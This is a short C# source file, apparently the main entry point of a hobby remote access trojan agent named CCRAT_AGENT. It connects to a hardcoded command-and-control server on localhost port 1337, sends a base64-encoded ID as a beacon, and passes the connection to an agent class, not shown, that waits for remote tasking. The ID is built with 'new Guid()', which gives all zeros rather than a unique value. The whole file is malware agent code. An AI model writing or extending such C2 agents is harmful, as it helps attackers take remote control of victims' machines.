using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace CCRAT_AGENT
{
    class Program
    {
        static void Main(string[] args)
        {
            Guid id = new Guid();
            TcpClient client = new TcpClient("127.0.0.1", 1337); //oof ouch owie my hardcoded C2
            Console.WriteLine("Connected to C2");
            string payload = Convert.ToBase64String(id.ToByteArray());
            StreamWriter writer = new StreamWriter(client.GetStream());
            writer.WriteLine(payload);
            writer.Flush();
            CCRatAgent agent = new CCRatAgent(client);
            agent.WaitForTasking();

        }
    }
}
